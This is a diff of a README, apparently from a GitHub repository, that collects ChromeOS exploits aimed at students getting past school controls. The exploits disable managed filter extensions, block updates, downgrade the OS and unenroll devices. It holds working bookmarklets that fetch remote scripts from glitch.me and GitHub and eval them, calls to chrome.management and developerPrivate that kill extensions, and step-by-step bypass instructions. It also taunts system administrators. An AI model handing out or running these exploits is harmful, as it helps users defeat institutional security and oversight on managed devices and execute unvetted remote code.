@@ -1,13 +1,13 @@
 # EXT-REMOVER
 This is a curated list of exploits for ChromeOS. It started with LTBEEF, and now there is more!
-Many of these exploits can destory your computer if used inproperly. So PLEASE PLEASE make sure you follow these instructions very carefully!
+Many of these exploits can destroy your computer if used improperly. So PLEASE PLEASE make sure you follow these instructions very carefully!
 If you need help ask it <a href="https://github.com/3kh0/ext-remover/discussions">here</a>
 
-Please use these only when you have permisson, I (3kh0) do not condone the use of any exploits for illegal purposes!
+Please use these only when you have permission, I (3kh0) do not condone the use of any exploits for illegal purposes!
   
 **ATTENTION ALL SYS ADMINS!!!**
 
-Hello, I am Echo and I created this repo in order to give exploits for the masses and to prove one thing, chromebooks are literal trash, and a poor excuse for a computer. They are full of exploits, you might think you blocked/patched them all but then 3 more pop up. It is a endless game of whack-a-mole. Treat your students to a windows computer, they will thank you. And don't you dare start to think "My school district does not have that kind of money", it most likely does! How much are you paying the blocker companies? Think about that.
+Hello, I am Echo and I created this repo in order to give exploits for the masses and to prove one thing, Chromebooks are literal trash, and a poor excuse for a computer. They are full of exploits, you might think you blocked/patched them all but then 3 more pop up. It is an endless game of whack-a-mole. Treat your students to a Windows computer, they will thank you. And don't you dare start to think "My school district does not have that kind of money", it most likely does! How much are you paying the blocker companies? Think about that.
 
 <img width="250px" src="https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png">  
 Image Credit: LittleMissNyan
@@ -17,7 +17,7 @@ Image Credit: LittleMissNyan
 
 **L**iterally **T**he **M**eatiest **E**xploit of **A**ll **T**ime
 
-From [ltmeat.bypassi.com](https://ltmeat.bypassi.com), if you are intrested in how this exploit works, check out that website.
+From [ltmeat.bypassi.com](https://ltmeat.bypassi.com), if you are interested in how this exploit works, check out that website.
 
 1. Find a page belonging to the extension you want to disable. `chrome://extensions`, `chrome://extensions-internals`, and `chrome://process-internals` are all good places to find your extension's ID (a 32-character lowercase string). You can also just do a simple Google search. Once you have your ID, substitute it into the hostname in the URL below:
 
@@ -31,7 +31,7 @@ For some filters like Securly, the block screen is already an extension page.
 3. While on the extension page (A), click the `chrome://kill` bookmark (B). The page should crash. You should already have the next step prepared. 
 4. Instantly start spamming `chrome://hang` (bookmark C) and quickly reload the page while spamming (ideally with the refresh key on your keyboard or `ctrl`+`R`). You should have reloaded within one or two seconds of killing the page. 
 
-If the extension page (bookmark A) no longer loads, then LTMEAT worked! You can close your tabs and the extension will basically be dead. If nothing loads, then you probably reloaded too late or spammed too slow. This isn't rocket science! Restart your computer to revert back to normal. 
+If the extension page (bookmark A) no longer loads, then LTMEAT worked! You can close your tabs and the extension will basically be dead. If nothing loads, then you probably reloaded too late or spammed too slowly. This isn't rocket science! Restart your computer to revert back to normal. 
 
 Exploit made by [Bypassi#7037](https://buymeacoffee.com/bypassi), [further reading](https://ltmeat.bypassi.com)
 
@@ -45,7 +45,7 @@ Okay, fair. Extension IDs are leaked in a couple of places. Generally, the best 
 
 **It says blocked by client?**
 
-That's the message you get when you try to visit an a page belonging to an extension that doesn't exist. The error message (`ERR_BLOCKED_BY_CLIENT`) is extremely misleading. Nobody blocked it--you just need to find the right extension ID (see above).
+That's the message you get when you try to visit a page belonging to an extension that doesn't exist. The error message (`ERR_BLOCKED_BY_CLIENT`) is extremely misleading. Nobody blocked it--you just need to find the right extension ID (see above).
 
 If you got this because you tried to visit the `extension_id_here_please` example URL, you should be extremely ashamed of yourself. Please change and grow as a person. 
 
@@ -57,9 +57,9 @@ There is a version where you don't need bookmarklets, but I am currently gatekee
 
 **I disabled an extension but now I can't load websites!**
 
-If you actually just read the writeup, you'd know that this would happen if the extension's background page loaded and its listeners were already initialized before you used `chrome://hang`. You can double-check whether the extension is listening using `chrome://extensions-internals`, assuming you have a few brain cells in your head.
+If you actually just read the write-up, you'd know that this would happen if the extension's background page loaded and its listeners were already initialized before you used `chrome://hang`. You can double-check whether the extension is listening using `chrome://extensions-internals`, assuming you have a few brain cells in your head.
 
-Anyway, no listeners means you were too slow. Either you waited more than three seconds between bookmark B and reloading the page, or you weren't spamming bookmark C fast enough. The most reliable fix for this is to just restart your computer and try again. Try to match the pace of the gif below: (note the reload) 
+Anyway, no listeners mean you were too slow. Either you waited more than three seconds between bookmark B and reloading the page, or you weren't spamming bookmark C fast enough. The most reliable fix for this is to just restart your computer and try again. Try to match the pace of the gif below: (note the reload) 
 
 ![image](https://ltmeat.bypassi.com/img/abc.gif)
 
@@ -85,8 +85,8 @@ I have bad news for you... not all filters are Chrome Extensions. And again, mak
 - Inspect element
 
 1. Go to `chrome://serviceworker-internals`
-2. Find your extension, this wont work if theres not a plugin in there.
-3. Hit the start button then the `inspect` button, run basic LTBEEF code
+2. Find your extension, this won't work if there's not a plugin in there.
+3. Hit the start button then the `inspect` button, and execute the basic LTBEEF code
 ```js
 chrome.management.setEnabled('<plugin id here>',false)
 ```
@@ -99,40 +99,39 @@ Thanks to Nyaann#3881 for this exploit
 
 <details>
 <summary><b>Extension Launcher</b> Install extensions w/o allowlist</summary>
-A bookmarklet capable of installing extensions, for those without a allowlist. 
+A bookmarklet capable of installing extensions, for those without an allowlist. 
 
 Steps: 
-Go to <a href="https://extension-installer.glitch.me/code.js">here</a> bookmark the code there (Might make a dns)
-go to chrome.google.com/webstorex and use the bookmarklet, then put the icon of the extension, the id, and name of it (Doesn't matter just put anything)
+Go to <a href="https://extension-installer.glitch.me/code.js">here</a> bookmark the code there (Might make a DNS)
+go to chrome.google.com/webstorex and use the bookmarklet, then put the icon of the extension, the id, and the name of it (This does not matter, you can put anything), then
 press download, and it will work.
 **Extra Notes**
-- Credit to "Aka, but nice" on discord.
-- Dns will be up soon, if bookmarklets are blocked
-- This will not work if you have a blocklist this is only for if when you go to the webstore it shows blocked
+- Credit to "Aka, but nice" on Discord.
+- DNS will be up soon for those who have JavaScript bookmarklets blocked.
+- This will not work if you have a blocklist this is only for if when you go to the web store it shows blocked
 </details>
 
 <details>
-<summary><b>New Point-Blank</b> Scripts on extension pages</summary>
+<summary><b> Point-Blank</b> Execute scripts on extension pages</summary>
 
-This exploit allows you to run scripts, on extensions pages, this is a great example of how Chromebooks are a piece of garbage.
+This exploit allows you to execute scripts on extensions pages, this is a great example of how Chromebooks are a piece of garbage.
 
 <i>Getting started</i>
-(Note: if bookmarklets are blocked your screwed.)
+(Note: if bookmarklets are blocked you're screwed.)
 1. Go to <a href="https://spot-maze-chinchilla.glitch.me/ingot.js">here</a> ([if blocked](https://raw.githubusercontent.com/3kh0/ext-remover/main/newpointblank.js)) on your school chromebook.
 2. Make a bookmark with the code there.
 3. Once that is done,
 
- If you have Securly go to <a href="https://tinyurl.com/bettergoofcurly">here</a> if it says blocked by chrome, reload (you have to actually have securly ofc)
+ If you have Securly go to <a href="https://tinyurl.com/bettergoofcurly">here</a> if it says blocked by Chrome, reload (you have to actually have Securly ofc)
  
- If you have iBoss go to <a href="https://tinyurl.com/goofboss">here</a>.
- 
- If you have Cisco Umbrella go to <a href="https://tinyurl.com/goofumbrella">here</a>.
+ If you have iBoss visit <a href="https://tinyurl.com/goofboss">here</a>.
+For Cisco Umbrella, visit <a href="https://tinyurl.com/goofumbrella">here</a>.
  
  If you have Blocksi go to <a href="https://tinyurl.com/goofsi">here</a>.
  
- And if you have GoGuardian(might not work) go to <a href="https://tinyurl.com/goofguardian">here</a>. 
+ And if you have GoGuardian (might not work), go to <a href="https://tinyurl.com/goofguardian">here</a>. 
  
- Now most of these links are a block page(this is intentional) on each page should have a blue link, click the link on the page if it opens a blank page click the bookmarklet that you just made and click either hard disable or soft disable, you can also run some of the scripts and run your own code, your extension may disable javascript being ran on it, so running your own code may not work.
+ Now most of these links are a block page(this is intentional) on each page should have a blue link, click the link on the page if it opens a blank page click the bookmarklet that you just made and click either hard disable or soft disable, you can also run some of the scripts and run your own code, your extension may disable javascript running on it, so running your own code may not work.
  
 **Extra notes**
 - I recommend doing soft disable, which only disables it until restart. 
@@ -157,34 +156,34 @@ javascript:opener.eval(`fetch("https://rounded-boiling-flax.glitch.me/uboss.js")
 2. Then go to the site with your blocker that was listed above.
 3. Run the code. Follow the instructions there.
 
-If it doesnt work let us know by creating a discussion, this was made in partnership with Aka, but nice#5094 and Bypassi#7037.
+If it doesn't work let us know by creating a discussion, this was made in partnership with Aka, but nice#5094 and Bypassi#7037.
 
 </details>
 
 <details>
 <summary><b>CAUB</b> Prevent Updates</summary>
 
-This exploit keeps your chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by Catakang#0987. Using onc files, you can convince your chromebook that the wifi that you're connected to is pay-to-use (like a hotspot using data), and thus it will not check for updates.
+This exploit keeps your Chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by Catakang#0987. Using onc files, you can convince your Chromebook that the wifi that you're connected to is pay-to-use (like a hotspot using data), and thus it will not check for updates.
 
 ![image](https://user-images.githubusercontent.com/58097612/212685932-ef9c802e-6040-42a3-be6e-10997162b7cd.png)
 
 <i>Getting started</i>
 
-1. Go to `chrome://network#state` (on your school chromebook of course; if this is blocked then ur kinda screwed lol).
-2. Scroll to the bottom of the page; you should see a list of "favorite" wifis that you've connected to in the past.
-3. Click the `+` sign next to the wifi name of each network that you commonly connect your chromebook to.
+1. Go to `chrome://network#state` (on your school-issued Chromebook of course; if this is blocked then ur kinda screwed lol).
+2. Scroll to the bottom of the page; you should see a list of "favorite" wifi that you've connected to in the past.
+3. Click the `+` sign next to the wifi name of each network that you commonly connect your Chromebook to.
 4. The more wifis you expand, the better, but note that they have to come from the "favorites" section.
 5. Use ctrl+a and ctrl+c to copy all the text on the entire network#state page.
 6. Go to [caub.glitch.me](https://caub.glitch.me/).
-7. Paste the copied text into the textbox bshelow.
+7. Paste the copied text into the textbox below.
 8. Press the `generate onc` button below the textbox.
 9. Once you have downloaded the file, go to `chrome://network#general`.
-10. Click on the `import onc` button.
-11. Import the newly downloaded file.
+10. Click on the `import ONC` button.
+11. Import the newly-downloaded file.
 
 **Extra notes**
-- Your chromebook will no longer automatically update. (as long as you are on a wifi that you used caub on)
-- Be careful not to stay on a wifi for too long without using caub on it, otherwise you might update.
+- Your Chromebook will no longer automatically update. (as long as you are on a wifi that you used CAUB on)
+- Be careful not to stay on wifi for too long without using CAUB on it, otherwise you might update.
 - We cannot guarantee that this will work on every wifi
 
 </details>
@@ -192,12 +191,12 @@ This exploit keeps your chromebook downgraded (or on the current version) withou
 <details>
 <summary><b>LTBEEF</b> Disable extensions</summary>
 
-LTBEEF is an exploit, created by Bypassi#7037, which abuses api endpoints within the google chrome webstore. The original site created for this exploit can be found at <a href="https://ltbeef.netlify.app/">ltbeef.netlify.app</a>
+LTBEEF is an exploit, created by Bypassi#7037, which abuses API endpoints within the Google Chrome web store. The original site created for this exploit can be found at <a href="https://ltbeef.netlify.app/">ltbeef.netlify.app</a>
 
-<b>Please Note:</b> This exploit only works on versions below 106, and eariler versions of 102
+<b>Please Note:</b> This exploit only works on versions below 106, and earlier versions of 102
   
 **Installation**  
-There are several vesions of this exploit you can use, here are the 2 most common versions:
+There are several versions of this exploit you can use, here are the 2 most common versions:
 - *Bookmarklets*  
     1. To use a GUI, bookmark one of the below scripts:  
     - Ingot  
@@ -213,7 +212,7 @@ There are several vesions of this exploit you can use, here are the 2 most commo
     javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
     ```
     2. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
-    3. Flip the switches on the extentions you want to disable. Simple!  
+    3. Flip the switches on the extensions you want to disable. Simple!  
 
     Photos of the GUI's:
     ![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)
@@ -261,34 +260,33 @@ Credit to SprinkzMC#8421 (aka Bypassi) for finding this!
 
 ![image](https://user-images.githubusercontent.com/58097612/207385046-5a9f6f07-6089-4775-9183-c11bd24ba02c.png)
 
-To re-enable just go to the chrome web listing for the extension and click on the banner.
+To re-enable just go to the Chrome web listing for the extension and click on the banner.
 
 </details>
 
 <details>
-<summary><b>Point Blank</b> Run code on system pages</summary>
+<summary>Blank3r</b>Reload extensions continuously</summary>
 
-Point Blank is an exploit that allows you to run bookmarklets on privilaged pages, sutch as the chrome extentions page. This exploit was also found by Bypassi, you can read more about how he discovered this exploit <a href="https://blog.bypassi.com/_/point-blank/"></a>
+Point Blank is an exploit that allows you to run bookmarklets on privileged pages, such as the Chrome extensions page. This exploit was made with Point Blank as well.
 
-You can either use the prompt or the gui the prompt is below
-
+The exploit code is below.
 1. Bookmark this code:
 
 ```js
 javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
 ```
 
-And the gui is in launcher.js
+And the GUI is in launcher.js
 
 2. Navigate to `chrome://extensions`.
 
-3. Click on a extension that YOU installed from the Chrome Web Store > Details.
+3. Click on an extension that YOU installed from the Chrome Web Store > Details.
 
 4. In the URL bar, copy the string of letters and numbers after the `/?id=`.
 
-5. Click "View in Chrome Web Store" and spam the excape key. If it loads into chrome webstore try again, if it is a blank screen click the bookmarklet.
+5. Click "View in Chrome Web Store" and spam the escape key. If it loads into Chrome Webstore try again, if it is a blank screen click the bookmarklet.
 
-5. Paste the id of the extension into the prompt or input box seperated by commas.
+5. Paste the id of the extension into the prompt separated by commas.
 
 If you close the tab, the exploit will stop working.
 
@@ -296,7 +294,7 @@ If you close the tab, the exploit will stop working.
 
 <details>
 <summary><b>SH1mmer</b> Unenrollment</summary>  
-SH1mmer is an exploit devloped by the crew at Mercury Workshop. Credits can be found within the menu and on their site.  
+SH1mmer is an exploit developed by the crew at Mercury Workshop. Credits can be found within the menu and on their site.  
 
 Further information is now located at these links:
 
@@ -308,30 +306,30 @@ Further information is now located at these links:
 
 <details>
 <summary><b>Downgrading</b> Change versions</summary>  
-Downgrading can be used for several exploits, to get to a version that does not have patches for certain exploits, sutch as LTBEEF. This is a built in feature of ChromeOS.
+Downgrading can be used for several exploits, to get to a version that does not have patches for certain exploits, such as LTBEEF. This is a built-in feature of ChromeOS.
 
 ![image](https://user-images.githubusercontent.com/58097612/212685863-3d6b8ce1-7caa-4735-95a8-8eb6787b227c.png)
 
 <i>Requirements</i>
-1. A USB thumb drive with at least 4gb of storage, some board have small or bigger images, I recommend 16gb
-2. A personal computer with access to downloading extentions
+1. A USB thumb drive with at least 4GB of storage, some boards have small or bigger images, I recommend 16GB
+2. A personal computer with access to downloading extensions
 3. A brain
 If you do not have these, you **CAN NOT** perform the exploit!
 
 <i>Setup</i>
-1. Navigate to `chrome://version` on the chromebook you with to downgrade and check for your board under `Platform` (ex I have a c3100 and it's board is stable-channel octopus).
+1. Navigate to `chrome://version` on the Chromebook you wish to downgrade and check for your board under `Platform` (ex I have a c3100 and its board is stable-channel octopus).
 
 <img src="https://user-images.githubusercontent.com/88395302/212484378-65e6e6e3-b995-48a1-b229-3265a4993279.png">
 
 2. Navigate to https://chrome100.dev/ , press `ctrl+f` and type in your board.
-3. Find and download the chrome version you want to your personal computer.
+3. Find and download the Chrome version you want to your personal computer.
 
 <i>Instlation</i>
-1. Install Chromebook Recovery Utility onto your personal computer. (found at <a href="https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en">chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm</a>
-2. Open the extention, and click on the settings button in to top right hand corner, and click "use local image".
+1. Install Chromebook Recovery Utility onto your personal computer. (found at <a href="https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en">chrome.google.com/webstore/detail/Chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm</a>
+2. Open the extension, click on the settings button in the top right-hand corner, and click "use local image".
 3. Select the recovery image you downloaded from chrome100.
 4. Plug in the USB you wish to use, and follow the prompts on the screen.
-5. On your chromebook, press esc+reload+power and follow the prompts.
+5. On your Chromebook, press esc+reload+power and follow the prompts.
 6. On the checking for updates screen, press `ctrl`+`shift`+`e` to skip the "checking for updates" screen.
 7. Profit.
 
@@ -341,20 +339,20 @@ If you do not have these, you **CAN NOT** perform the exploit!
 <summary><b>Killcurly</b> Break extensions</summary>
 Kill extension, by signing out.
 
-1. Visit `chrome://settings/signOut`, the O in Out must be capital.
+1. Visit `chrome://settings/signOut`, the O in Out must be capitalized.
 2. Press the big blue button
 3. Go to `chrome://restart`
 4. Now visit `tinyurl.com/AddSession` or [this link](https://accounts.google.com/signin/v2/identifier?hl=en&continue=https%3A%2F%2Fwww.google.com%2F&ec=GAlAmgQ&flowName=GlifWebSignIn&flowEntry=AddSession)
 5. Add your **SCHOOL** account back. It WILL NOT WORK if you add a home account back. This is just so you can still access Google Drive, Youtube, and any Google service.
 6. All extensions should stop working.
 7. Note that you have to repeat this every time you restart or sign out.
-8. If the link gets patched and you no longer see the blue button, go to `chrome://settings/resetProfileSettings` click current settings, it'll open a blank page, on that page run 
+8. If your Chrome version is `v112`, this exploit will no longer work, the bypass to this is listed further on. Visit`chrome://settings/resetProfileSettings` click current settings, and it'll open a blank page, on that page run 
 ```js
 javascript:opener.chrome.send("TurnOffSync");
 ```
 And visit `chrome://restart`.
-
-**This was discoverered by zoroark**
+`
+**This was discovered by Zoroark**
 
 </details>
 
